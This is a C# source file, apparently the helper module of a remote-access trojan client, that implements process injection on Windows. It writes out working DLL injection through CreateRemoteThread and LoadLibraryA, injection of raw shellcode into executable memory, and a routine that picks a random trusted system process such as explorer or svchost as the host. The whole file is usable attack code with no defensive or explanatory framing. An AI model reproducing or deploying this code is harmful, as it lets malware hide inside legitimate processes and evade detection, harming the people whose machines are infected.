using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Client.Helper
{
    public static class ProcessInjection
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static bool InjectDll(int processId, string dllPath)
        {
            try
            {
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
                if (hProcess == IntPtr.Zero)
                    return false;

                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 
                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                
                if (allocMemAddress == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                byte[] dllPathBytes = System.Text.Encoding.Default.GetBytes(dllPath);
                bool written = WriteProcessMemory(hProcess, allocMemAddress, dllPathBytes, (uint)dllPathBytes.Length, out int bytesWritten);
                
                if (!written)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                if (loadLibraryAddr == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                
                if (hThread == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                CloseHandle(hThread);
                CloseHandle(hProcess);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static bool InjectShellcode(int processId, byte[] shellcode)
        {
            try
            {
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
                if (hProcess == IntPtr.Zero)
                    return false;

                IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                
                if (allocMemAddress == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                bool written = WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)shellcode.Length, out int bytesWritten);
                
                if (!written)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
                
                if (hThread == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return false;
                }

                CloseHandle(hThread);
                CloseHandle(hProcess);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static int[] GetTargetProcesses()
        {
            try
            {
                string[] targetNames = { "explorer", "svchost", "RuntimeBroker", "dwm" };
                var processList = new System.Collections.Generic.List<int>();

                foreach (string name in targetNames)
                {
                    Process[] processes = Process.GetProcessesByName(name);
                    foreach (Process proc in processes)
                    {
                        try
                        {
                            if (proc.SessionId == Process.GetCurrentProcess().SessionId)
                            {
                                processList.Add(proc.Id);
                            }
                        }
                        catch { }
                    }
                }

                return processList.ToArray();
            }
            catch
            {
                return new int[0];
            }
        }

        public static int FindSuitableTarget()
        {
            int[] targets = GetTargetProcesses();
            if (targets.Length > 0)
            {
                Random rnd = new Random();
                return targets[rnd.Next(targets.Length)];
            }
            return -1;
        }
    }
}
